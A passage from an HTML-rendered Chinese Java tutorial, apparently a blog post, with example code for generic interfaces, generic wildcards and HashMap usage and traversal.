class="hljs-type">Generic</span> <span class="hljs-variable">g</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Generic</span>();<br><br>        g.show(<span class="hljs-number">123</span>);<br>        g.show(<span class="hljs-string">&quot;String&quot;</span>);<br>        g.show(<span class="hljs-number">3.14f</span>);<br>        g.show(<span class="hljs-number">3.14</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="f24a149e"></a></p><h3 id="5-4-泛型接口"><a href="#5-4-泛型接口" class="headerlink" title="5.4 - 泛型接口"></a>5.4 - 泛型接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo04;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  泛型接口</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Generic</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(T t)</span>;<span class="hljs-comment">//定义抽象方法</span><br>&#125;<br>-------------------------------------------------------------<br>  <span class="hljs-keyword">package</span> demo04;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericImpl</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Generic</span>&lt;T&gt;&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(T t)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;实现类中的show方法:&quot;</span> + t);<br>    &#125;<br><span class="hljs-keyword">package</span> demo04;<br>-------------------------------------------------------------<br><span class="hljs-keyword">package</span> demo04;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  泛型接口测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        GenericImpl&lt;String&gt; strG = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericImpl</span>&lt;&gt;();<br>        strG.show(<span class="hljs-string">&quot;String&quot;</span>);<br><br><br>        <span class="hljs-comment">//通过匿名内部类的对象直接调用并实现其中的方法</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Generic</span>&lt;Integer&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(Integer integer)</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;匿名内部类的show方法&quot;</span> + integer);<br>            &#125;<br>        &#125;.show(<span class="hljs-number">9527</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="ee264d8b"></a></p><h3 id="5-5-泛型通配符"><a href="#5-5-泛型通配符" class="headerlink" title="5.5 - 泛型通配符"></a>5.5 - 泛型通配符</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  泛型通配符</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// &lt;?&gt;  通配到所有 相当于Object</span><br>        ArrayList&lt;?&gt; list01 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;();<br>        ArrayList&lt;?&gt; list02 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt;();<br>        ArrayList&lt;?&gt; list03 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Float&gt;();<br>        ArrayList&lt;?&gt; list04 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Number&gt;();<br><br>        <span class="hljs-comment">// &lt;? extends Number&gt;  上限</span><br>        ArrayList&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span>&gt; list05 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Number&gt;();<br>        ArrayList&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span>&gt; list06 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt;();<br>        ArrayList&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span>&gt; list07 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Float&gt;();<br>        <span class="hljs-comment">//因为String类型与Number类型没有继承关系</span><br>        <span class="hljs-comment">//ArrayList&lt;? extends Number&gt; list08 = new ArrayList&lt;String&gt;();</span><br><br>        <span class="hljs-comment">//   &lt;? super Number&gt;  下限</span><br>        ArrayList&lt;? <span class="hljs-built_in">super</span> Number&gt; list09 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Number&gt;();<br><span class="hljs-comment">//        ArrayList&lt;? super Number&gt; list10 = new ArrayList&lt;Integer&gt;();</span><br><span class="hljs-comment">//        ArrayList&lt;? super Number&gt; list11 = new ArrayList&lt;Float&gt;();</span><br>        ArrayList&lt;? <span class="hljs-built_in">super</span> Number&gt; list12 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="253fb396"></a></p><h3 id="5-6-泛型通配符实际应用"><a href="#5-6-泛型通配符实际应用" class="headerlink" title="5.6 - 泛型通配符实际应用"></a>5.6 - 泛型通配符实际应用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  泛型通配符的实际应用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ArrayList&lt;String&gt; strList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        show(strList);<br><span class="hljs-comment">//        showUp(strList); //与Number无关 所以放不进去</span><br><span class="hljs-comment">//        showDown(strList);//与Number无关 所以放不进去</span><br>        ArrayList&lt;Integer&gt; intList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        show(intList);<br>        showUp(intList);<br><span class="hljs-comment">//        showDown(intList);</span><br>        ArrayList&lt;Number&gt; numList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        show(numList);<br>        showUp(numList);<br>        showDown(numList);<br>        ArrayList&lt;Object&gt; objList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        show(objList);<br><span class="hljs-comment">//        showUp(objList);  Object是Number的父类，需要的是Number的子类</span><br>        showDown(objList);<br>    &#125;<br>    <span class="hljs-comment">// &lt;?&gt;  通配所有</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(ArrayList&lt;?&gt; list)</span> &#123;&#125;<br><br>    <span class="hljs-comment">// &lt;? extends Number&gt;  表示上限，传递的类型必须是Number本身或其子类</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showUp</span><span class="hljs-params">(ArrayList&lt;? extends Number&gt; list)</span> &#123;&#125;<br><br>    <span class="hljs-comment">// &lt;? extends Number&gt;  表示下限，传递的类型必须是Number本身获取其父类</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showDown</span><span class="hljs-params">(ArrayList&lt;? <span class="hljs-built_in">super</span> Number&gt; list)</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="38be3559"></a></p><h2 id="6-Map"><a href="#6-Map" class="headerlink" title="6 - Map"></a>6 - Map</h2><blockquote><p>双列集合：用来存储键值对的集合</p></blockquote><p><a name="26f942e0"></a></p><h3 id="6-1-概述"><a href="#6-1-概述" class="headerlink" title="6.1 - 概述"></a>6.1 - 概述</h3><ul><li><code>interface Map&lt;K,V&gt;</code>：K(key) 键    V(value)值</li><li>将键映射到值的对象，不能出现重复的键，每个键最多映射到一个值</li></ul><p>例子：学生学号和姓名</p><table><thead><tr><th>学号（key）</th><th>姓名（value）</th></tr></thead><tbody><tr><td>STU001</td><td>张三</td></tr><tr><td>STU002</td><td>李四</td></tr><tr><td>STU003</td><td>张三</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Map集合基本使用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//父类引用指向子类对象形成多态</span><br>        Map&lt;String,String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//设置值</span><br>        map.put(<span class="hljs-string">&quot;STU001&quot;</span>,<span class="hljs-string">&quot;Andy&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU002&quot;</span>,<span class="hljs-string">&quot;Jack&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU003&quot;</span>,<span class="hljs-string">&quot;Lucy&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU004&quot;</span>,<span class="hljs-string">&quot;Lily&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU005&quot;</span>,<span class="hljs-string">&quot;Bob&quot;</span>);<br>        <span class="hljs-comment">//如果键重复，则代表设置元素</span><br>        <span class="hljs-comment">//如果键不重复，则代表添加元素</span><br><br>        System.out.println(map);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="d5ae073a"></a></p><h3 id="6-2-Map的集合功能"><a href="#6-2-Map的集合功能" class="headerlink" title="6.2 - Map的集合功能"></a>6.2 - Map的集合功能</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>V put(K key,V value)</code></td><td>设置键值对</td></tr><tr><td><code>V remove(Object key)</code></td><td>删除元素</td></tr><tr><td><code>void clear()</code></td><td>清空集合</td></tr><tr><td><code>boolean containsKey()</code></td><td>判断键是否存在</td></tr><tr><td><code>boolean containsValue()</code></td><td>判断值是否存在</td></tr><tr><td><code>boolean isEmpty()</code></td><td>判断是否为空</td></tr><tr><td><code>int size()</code></td><td>获取集合中元素个数</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Map集合的基本功能</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo08</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Map&lt;String,String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//添加元素</span><br>        map.put(<span class="hljs-string">&quot;STU001&quot;</span>,<span class="hljs-string">&quot;Andy&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU002&quot;</span>,<span class="hljs-string">&quot;Jack&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU003&quot;</span>,<span class="hljs-string">&quot;Lucy&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU004&quot;</span>,<span class="hljs-string">&quot;Lily&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU005&quot;</span>,<span class="hljs-string">&quot;Bob&quot;</span>);<br><br>        <span class="hljs-comment">//删除元素</span><br>        System.out.println(map.remove(<span class="hljs-string">&quot;STU003&quot;</span>));<br><br>        <span class="hljs-comment">//判断键和值是否存在</span><br>        System.out.println(map.containsKey(<span class="hljs-string">&quot;STU003&quot;</span>));<span class="hljs-comment">//false</span><br>        System.out.println(map.containsKey(<span class="hljs-string">&quot;STU002&quot;</span>));<span class="hljs-comment">//true</span><br>        System.out.println(<span class="hljs-string">&quot;---------------&quot;</span> );<br>        System.out.println(map.containsValue(<span class="hljs-string">&quot;Lucy&quot;</span>));<span class="hljs-comment">//false</span><br>        System.out.println(map.containsValue(<span class="hljs-string">&quot;Bob&quot;</span>));<span class="hljs-comment">//true</span><br><br>        System.out.println(map);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="77f25833"></a></p><h3 id="6-3-Map集合的获取功能"><a href="#6-3-Map集合的获取功能" class="headerlink" title="6.3 - Map集合的获取功能"></a>6.3 - Map集合的获取功能</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>V get(Object key)</code></td><td>根据键获取值</td></tr><tr><td><code>Set&lt;K&gt; keySet()</code></td><td>获取所有键的Set集合</td></tr><tr><td><code>Collection&lt;V&gt; values()</code></td><td>获取所有值的Collection集合</td></tr><tr><td><code>Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()</code></td><td>获取所有键值对的对象的集合</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Collection;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Map集合的获取功能</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo09</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Map&lt;String,String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//添加元素</span><br>        map.put(<span class="hljs-string">&quot;STU001&quot;</span>,<span class="hljs-string">&quot;Andy&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU002&quot;</span>,<span class="hljs-string">&quot;Jack&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU003&quot;</span>,<span class="hljs-string">&quot;Lucy&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU004&quot;</span>,<span class="hljs-string">&quot;Lily&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU005&quot;</span>,<span class="hljs-string">&quot;Bob&quot;</span>);<br><br>        <span class="hljs-comment">//get通过键获取值</span><br>        System.out.println(map.get(<span class="hljs-string">&quot;STU005&quot;</span>));<br>        System.out.println(map.get(<span class="hljs-string">&quot;STU001&quot;</span>));<br><br>        <span class="hljs-comment">//keySet</span><br>        Set&lt;String&gt; keySet = map.keySet();<br>        System.out.println(keySet);<br><br>        <span class="hljs-comment">//values</span><br>        Collection&lt;String&gt; values = map.values();<br>        System.out.println(values);<br><br>        <span class="hljs-comment">//entrySet</span><br>        Set&lt;Map.Entry&lt;String, String&gt;&gt; es = map.entrySet();<br>        System.out.println(es);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="f4c51c74"></a></p><h3 id="6-4-Map集合的遍历"><a href="#6-4-Map集合的遍历" class="headerlink" title="6.4 - Map集合的遍历"></a>6.4 - Map集合的遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Collection;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Map集合的遍历</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo10</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Map&lt;String,String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//添加元素</span><br>        map.put(<span class="hljs-string">&quot;STU001&quot;</span>,<span class="hljs-string">&quot;Andy&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU002&quot;</span>,<span class="hljs-string">&quot;Jack&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU003&quot;</span>,<span class="hljs-string">&quot;Lucy&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU004&quot;</span>,<span class="hljs-string">&quot;Lily&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;STU005&quot;</span>,<span class="hljs-string">&quot;Bob&quot;</span>);<br><br>        <span class="hljs-comment">//遍历方式一  values</span><br>        Collection&lt;String&gt; values = map.values();<span class="hljs-comment">//获取全部值的集合</span><br>        <span class="hljs-keyword">for</span> (String str : values) &#123;<span class="hljs-comment">//遍历集合</span><br>            System.out.println(str);<br>        &#125;<br><br>        <span class="hljs-comment">//遍历方式二：keySet</span><br>        Set&lt;String&gt; keySet = map.keySet();<span class="hljs-comment">//获取所有键，存放到Set集合中</span><br>        <span class="hljs-keyword">for</span> (String key : keySet) &#123;<span class="hljs-comment">//遍历键</span><br>            System.out.println(key + <span class="hljs-string">&quot;&lt;==&gt;&quot;</span> + map.get(key));<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br><br>        <span class="hljs-comment">//遍历方式三： entrySet</span><br>        Set&lt;Map.Entry&lt;String, String&gt;&gt; es = map.entrySet();<span class="hljs-comment">//获取所有键值对的对象，存放到集合中</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, String&gt; e: es) &#123;<span class="hljs-comment">//遍历集合中的么每个对象，每个对象都是键值对对象</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>            System.out.println(key + <span class="hljs-string">&quot;&lt;==&gt;&quot;</span> + value);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="44827622"></a></p><h3 id="6-5-存储并遍历学生对象"><a href="#6-5-存储并遍历学生对象" class="headerlink" title="6.5 - 存储并遍历学生对象"></a>6.5 - 存储并遍历学生对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Collection;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO Map集合存储并遍历学生对象</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo11</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        HashMap&lt;String, Student&gt; hm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<span class="hljs-comment">//创建双列集合用来存储学生对象</span><br><br>        <span class="hljs-comment">//添加元素</span><br>        hm.put(<span class="hljs-string">&quot;STU001&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Andy&quot;</span>,<span class="hljs-number">18</span>));<br>        hm.put(<span class="hljs-string">&quot;STU002&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Jack&quot;</span>,<span class="hljs-number">24</span>));<br>        hm.put(<span class="hljs-string">&quot;STU003&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Lucy&quot;</span>,<span class="hljs-number">27</span>));<br>        hm.put(<span class="hljs-string">&quot;STU004&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Lily&quot;</span>,<span class="hljs-number">21</span>));<br><br>        showMap01(hm);<br>        showMap02(hm);<br>        showMap03(hm);<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span 